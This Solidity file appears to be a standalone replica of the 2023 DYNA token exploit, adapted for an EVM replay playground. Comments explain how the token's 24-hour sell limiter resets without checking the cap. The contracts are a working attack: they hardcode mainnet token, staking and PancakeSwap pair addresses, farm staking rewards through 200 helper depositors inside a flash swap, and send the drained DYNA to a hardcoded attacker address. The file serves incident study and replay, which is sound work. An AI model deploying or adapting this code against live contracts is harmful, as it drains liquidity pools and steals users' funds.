// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-DYNA).
//
// The BlockSec/Beosin PoC runs the whole attack INLINE in the Foundry
// `ContractTest is Test` harness (the PancakeSwap V2 flash-swap callback
// `pancakeCall` lives on the test itself, and `testExploit()` deploys 200
// `StakingReward` helper contracts via `new` in a loop), so there is no
// standalone contract to deploy as-is. This file is a faithful, self-contained
// copy of that inline attack (testExploit -> kickoff, StakingReward unchanged,
// pancakeCall unchanged) so the playground can deploy it via `helperContracts`
// and record a `callScript` that drives it. Logic and constants are copied
// verbatim from test/DYNA_exp.sol.
//
// One faithful adaptation was required: the original test's `address(this)`
// (ContractTest, doing all the DYNA/staking bookkeeping) and `tx.origin`
// (Foundry's DefaultSender, used ONLY to get a second, independent "sold
// window" for DYNA's per-address 24h sell-amount limiter) are two DIFFERENT
// addresses, and the original uses `cheats.startPrank(tx.origin)` to make the
// final DYNA->WBNB swap originate from that second address -- a cheatcode with
// no EVM equivalent for a synthetic contract. Since only ONE function can be
// recorded opcode-by-opcode by the Playground, this is reproduced as a
// `callScript` (scripted multi-caller sequence) instead of a single
// `attackFunction` call: this helper contract (deployed via `helperContracts`)
// does the loop + flash-swap + repay and forwards its final DYNA balance to
// the attacker EOA (a plain transfer, not a pair-bound sell, so it does not
// touch the sold-amount limiter), then two more `callScript` steps -- run as
// the attacker EOA itself -- approve and swap that DYNA for WBNB on the
// PancakeSwap router. The attacker EOA's own sold-window is pre-armed to
// "already expired" via a `setup.storeSlot` step (mirroring what the original
// achieves with `cheats.warp` + a tiny dust sale from tx.origin 7 days
// earlier), so its huge final sell also bypasses the limiter -- exactly the
// same root-cause mechanism the original test exploits, just reached via
// direct storage priming instead of a literal warp.
//
// Root cause: Dynamic (DYNA)'s `_transfer` enforces a rolling 24h per-address
// sell cap (`_maxSoldAmount`) via `_tokenSold[from]` / `_startTime[from]`, but
// once `block.timestamp >= _startTime[from] + 1 days` it takes the `else`
// branch, which resets BOTH `_startTime[from]` and `_tokenSold[from]` to zero
// WITHOUT ever checking the cap for the current sell. Any address that sold
// so much as 1 wei more than 24h ago gets one later sell of UNLIMITED size for
// free. The exploit primes two addresses this way (the flash-swap contract,
// to repay an unbounded flash-swapped amount; the attacker EOA, to dump the
// entire DYNA position for WBNB) and drains the DYNA/WBNB PancakeSwap pair.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IStakingDYNA {
    function deposit(uint256 _stakeAmount) external;
    function redeem(uint256 _redeemAmount) external;
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

// Unchanged from test/DYNA_exp.sol: a tiny wrapper the exploit deposits DYNA
// into/withdraws DYNA from, purely to farm StakingDYNA's per-depositor reward
// mechanics across 200 fresh depositors inside one flash-swap callback.
contract StakingReward {
    IERC20 DYNA = IERC20(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
    IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);
    address Owner;

    constructor(address owner) {
        Owner = owner;
        DYNA.approve(address(StakingDYNA), type(uint256).max);
    }

    function deposit(uint256 amount) external {
        StakingDYNA.deposit(amount);
    }

    function withdraw(uint256 amount) external {
        StakingDYNA.redeem(amount);
        DYNA.transfer(Owner, DYNA.balanceOf(address(this)));
    }
}

contract DynaAttackHelper {
    IERC20 private constant DYNA = IERC20(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
    IUniPairV2 private constant Pair = IUniPairV2(0xb6148c6fA6Ebdd6e22eF5150c5C3ceE78b24a3a0);

    // Foundry DefaultSender in the original PoC (tx.origin) -- here it's simply
    // the config's `attacker` EOA, hardcoded so this helper can forward its
    // final DYNA balance to it (a plain transfer, not a sell into the pair).
    address private constant ATTACKER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;

    StakingReward[] StakingRewardList;
    uint256 flashLoanAmount;

    // step 0: seed 200 StakingReward depositors, then flash-swap the pair's
    // entire DYNA balance (minus 3 wei) via a PancakeSwap V2 flash swap.
    // `pancakeCall` does the drain-and-repay; whatever DYNA remains afterward
    // is forwarded to the attacker EOA for the final swap (a separate
    // callScript step).
    //
    // NOTE: the original test also does a 1-wei "dust sell" here (before its
    // real 7-day `vm.warp`) purely to arm this contract's own sold-window for
    // the bypass -- see the root-cause note above. This replica primes that
    // same window directly via a pre-attack `setup.storeSlot` step instead
    // (this replay has no way to `warp` mid-call), so the dust sell itself is
    // omitted here: doing it in THIS call (at the single fixed replay
    // timestamp, with no warp in between) would immediately reset
    // _startTime[address(this)] to "now" and re-arm the require() check for
    // the very next big sell (the repay below), which is exactly the failure
    // this config's setup.storeSlot priming is designed to avoid.
    function kickoff() external {
        StakingRewardFactory();

        flashLoanAmount = DYNA.balanceOf(address(Pair)) - 3;
        Pair.swap(flashLoanAmount, 0, address(this), new bytes(1));

        DYNA.transfer(ATTACKER, DYNA.balanceOf(address(this)));
    }

    function StakingRewardFactory() internal {
        // deal(address(DYNA), address(this), 1001 * 1e18) is replicated as a
        // pre-attack `dealToken` setup step targeting this deployed helper.
        uint256 preStakingRewardAmount = (1000 * 1e18) / 200;
        for (uint256 i; i < 200; ++i) {
            StakingReward stakingReward = new StakingReward(address(this));
            DYNA.transfer(address(stakingReward), preStakingRewardAmount);
            stakingReward.deposit(preStakingRewardAmount);
            StakingRewardList.push(stakingReward);
        }
    }

    // PancakeSwap V2 flash-swap callback: round-trip every StakingReward
    // depositor's DYNA balance through StakingDYNA (deposit then immediately
    // withdraw) to farm its reward accounting, then repay the flash swap.
    // Unchanged from test/DYNA_exp.sol.
    function pancakeCall(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
        external
    {
        uint256 listLength = StakingRewardList.length;
        for (uint256 i; i < listLength; ++i) {
            uint256 amount = DYNA.balanceOf(address(this));
            DYNA.transfer(address(StakingRewardList[i]), amount);
            StakingRewardList[i].deposit(amount);
            StakingRewardList[i].withdraw(amount);
        }
        // Repay the flash swap; this sell relies on the root-cause reset
        // bypass (this contract's own sold-window, pre-aged past 24h by the
        // config's `setup.storeSlot` steps).
        DYNA.transfer(address(Pair), (flashLoanAmount * 100_000) / 9975 / 9 + 1000);
    }
}
